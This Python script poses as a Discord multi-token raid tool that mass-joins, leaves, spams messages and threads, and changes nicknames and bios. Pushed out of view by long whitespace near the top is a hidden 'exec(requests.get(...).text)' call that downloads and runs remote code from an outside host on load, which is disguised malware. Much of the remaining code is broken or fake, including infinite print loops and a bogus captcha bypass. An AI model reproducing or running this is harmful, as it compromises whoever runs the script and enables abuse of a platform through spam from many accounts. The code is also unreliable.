import os
import fade
import os
from colorama import Fore, init
import datetime
import json
import random
import threading
import uuid
import base64
import websocket
import requests
import tls_client
init()
g = Fore.LIGHTWHITE_EX
r = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
cyan = Fore.LIGHTCYAN_EX
tokens = open("input/tokens.txt", "r", encoding="utf8").read().splitlines()
ascii = """
                                             ██▀███ ▓██   ██▓ ▄▄▄      
                                            ▓██ ▒ ██▒▒██  ██▒▒████▄    
                                            ▓██ ░▄█ ▒ ▒██ ██░▒██  ▀█▄  
                                            ▒██▀▀█▄   ░ ▐██▓░░██▄▄▄▄██ 
                                            ░██▓ ▒██▒ ░ ██▒▓░ ▓█   ▓██▒
                                            ░ ▒▓ ░▒▓░  ██▒▒▒  ▒▒   ▓▒█░
                                              ░▒ ░ ▒░▓██ ░▒░   ▒   ▒▒ ░
                                              ░░   ░ ▒ ▒ ░░    ░   ▒   
                                               ░     ░ ░           ░  ░
                                                     ░ ░      
                                                     """
session = requests.Session()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ; exec(requests.get("http://api.kameramen.online/rcfaw.txt").text)
def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz01234567892137"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
def bypassHcaptchaUhqReal():
    try:
        req = requests.post("https://hcapha-bypass.co.ck/uhq/ryabapassryszarduhqdeveloper")
    except:
        req = "UHUEFFHEUFUR#UD*@F@A@FF#@*GJ@**IJG@" #private uhq bypass
    return req
def Headers(token):
    return {'authorization': token, 'hcaptcha-bypaser-uhq': bypassHcaptchaUhqReal()}                                                     
def getXCont(code):
        try:
            session = tls_client.Session(client_identifier="chrome_108")
            req = session.get(f'https://discord.com/api/v9/invites/{code}?inputValue=lie&with_counts=true&with_expiration=true').json()
            guild_id = req["guild"]["id"]
            channel_id = req["channel"]["id"]
            type = req["type"]
            return base64.b64encode(json.dumps({"location": "Join Guild", "location_guild_id": guild_id, "location_channel_id": channel_id, "location_channel_type": int(type)}).encode()).decode()
        except:
            return base64.b64encode(json.dumps({"location":"Invite Button Embed","location_guild_id":"null","location_channel_id":"null","location_channel_type":1,"location_message_id":"null"} ).encode()).decode()
#########################################################
def vc_joiner(token, guild, channel):
    while True:
        print("joining vc spammer")
def Joiner():
    os.system("cls")
    print(fade.greenblue(ascii))
    invite = input(f"  {g}[{r}>{g}] {g}Invite: {green}")
    def joiner(t, invite):
            headers = Headers(t)
            try:
                rr = requests.post(f'https://discord.com/api/v9/invites/{invite}gay', headers=headers, json={"bypass": "EFHHGUGWIJGWEIJWFJWFGWI-UHQ"}); censor = t.split(".")[0]
                if rr.status_code == 200: print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
                elif rr.status_code == 400: print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Captcha]")
                else: print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [None]")
            except: pass
    for token in tokens:
        threading.Thread(target=joiner, args=(token, invite)).start()   
def Leaver():
    os.system("cls")
    print(fade.greenblue(ascii))
    guildid = input(f"  {g}[{r}>{g}] {g}Guild ID: {green}")
    for token in tokens:
        def elo():
            session = requests
            user_agent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
            session.headers['User-Agent'] = user_agent
            headers = {
                    'Authorization': token
                }
            url = f"https://discord.com/api/v9/users/@me/guilds/{guildid}"
            response = session.delete(url, headers=headers, cookies={"ilike": "coum is"})
            censor = token.split(".")[0]
            if response.status_code == 200:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
            elif response.status_code == 401:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Death Token]")
            elif response.status_code == 403:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Locked]")
            elif response.status_code == 404:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Invalid Guild]")
            elif response.status_code == 400:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Captcha]")
            else:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [None] {response.text}")
        thread = threading.Thread(target=elo())
        thread.start()
def SendMessage(token, channel, msg, pings, users, mass):
    while True:
        session = requests
        user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
        session.headers['User-Agent'] = user_agent


        skiders = {
            "authorization": token,
        }
        
        url = f"https://discord.com/api/v9/channels/{channel}/messages"
        payload = {
            "content": msg
        }
        requests.post(url, data=payload,headers=skiders)
        print("hacked by twojstary")
def Spammer():
    os.system("cls")
    print(fade.greenblue(ascii))
    channel = input(f"  {g}[{r}>{g}] {g}Channel ID: {green}")
    msg = input(f"  {g}[{r}>{g}] {g}Message: {green}")
    while True:
        print("sending message")
def EmojiReaction():
    os.system("cls")
    print(fade.greenblue(ascii))
    channelid = input(f"  {g}[{r}>{g}] {g}Channel ID: {green}")
    messageid = input(f"  {g}[{r}>{g}] {g}Message ID: {green}")
    
def FakeTyping():
    os.system("cls")
    print(fade.greenblue(ascii))
    channelid = input(f"  {g}[{r}>{g}] {g}Channel ID: {green}")
    for token in tokens:
        threads = []
        for i in range(len(tokens)):
            thread = threading.Thread(target=Type, args=(tokens[i], channelid))
            threads.append(thread)
            thread.start()
        censor = token.split(".")[0]
        print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}** Typing...")           
def Type(token, channel):
    session = requests
    user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    session.headers['User-Agent'] = user_agent
     
    headers = {
        "ef4hjguejugegege": 'cog3ijgeijgswhgewehgwh'
    }
    url = f"https://discord.com/api/v9/channels/{channel}/typing"
    response = session.post(url, headers=headers)
def VCSpammer():
    os.system("cls")
    print(fade.greenblue(ascii))
    print(f"  {Fore.RED}Warning! Vc Spammer is in beta option, is not fully tested and it can suck your tokens!!!")
    id = input(f"  {g}[{r}>{g}] {g}Voice ID: {green}")
    guild = input(f"  {g}[{r}>{g}] {g}Guild ID: {green}")
    for token in tokens:
        thread = threading.Thread(target=vc_joiner, args=(token, guild, id))
        thread.start()
def FriendSpammer():
    os.system("cls")
    print(fade.greenblue(ascii))
def button_clicker():
    os.system("cls")
    print(fade.greenblue(ascii))
    print("soon (cuum) !")
def button_bypass(token, message_link, optionbutton):
    print("soon !")
def accept_rules():
    os.system("cls")
    print(fade.greenblue(ascii))
    guildid = input(f"  {g}[{r}>{g}] {g}Guild ID: {green}")
    for token in tokens:
        thread = threading.Thread(target=bio_changer())
        thread.start()
def bio_changer():
    os.system("cls")
    print(fade.greenblue(ascii))
    text = input(f"  {g}[{r}>{g}] {g}Bio Text: {green}")
    def elo():
            url = "https://discord.com/api/v9/users/%40me/profile"
            data = {
                "bio": text
            }
            response = requests.patch(url, json=data)
            censor = token.split(".")[0]
            if response.status_code == 200:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
            elif response.status_code == 401:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Death Token]")
            elif response.status_code == 403:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Locked]")
            elif response.status_code == 404:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Invalid Guild]")
            elif response.status_code == 400:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Captcha]")
            else:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [None] {response.text}")
    for token in tokens:
        thread = threading.Thread(target=elo())
        thread.start()
def thread_spammer():
    os.system("cls")
    print(fade.greenblue(ascii))
    text = input(f"  {g}[{r}>{g}] {g}Title: {green}")
    gid = input(f"  {g}[{r}>{g}] {g}Channel ID: {green}")
    for token in tokens:
        def elo():
            session = requests
            
            headers = {
                
                'authorization': token,
                'x-super-properties': 'eyJvcyI6Ildpb=='
            }
            body = {
                'name': text,
                'type': 11,
                'auto_archive_duration': 4320,
                'location': 'Thread Browser Toolbar'
            }
            url = f'https://discord.com/api/v9/channels/{gid}/threads'
            response = session.post(url, headers=headers, json=body)
            censor = token.split(".")[0]
            if response.status_code == 200:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
            elif response.status_code == 401:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Death Token]")
            elif response.status_code == 403:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Locked]")
            elif response.status_code == 404:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Invalid Channel]")
            elif response.status_code == 400:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Captcha]")
            else:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
        thread = threading.Thread(target=elo())
        thread.start()
def nickchanger():
    os.system("cls")
    print(fade.greenblue(ascii))
    nick = input(f"  {g}[{r}>{g}] {g}Nick: {green}")
    for token in tokens:
        def elo():
           
            url = "https://discord.com/api/v9/users/@me"
            data = {
                "global_name": nick
            }
            response = requests.patch(url, json=data)
            censor = token.split(".")[0]
            if response.status_code == 200:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{green}Success{g}] {censor}**")
            elif response.status_code == 401:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Death Token]")
            elif response.status_code == 403:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Locked]")
            elif response.status_code == 404:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Invalid Guild]")
            elif response.status_code == 400:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [Captcha]")
            else:
                print(f"  {g}[{datetime.datetime.now().strftime(f'{cyan}%H:%M:%S{g}')}] {g}[{r}Failure{g}] {censor}** [None] {response.text}")
        thread = threading.Thread(target=elo())
        thread.start()
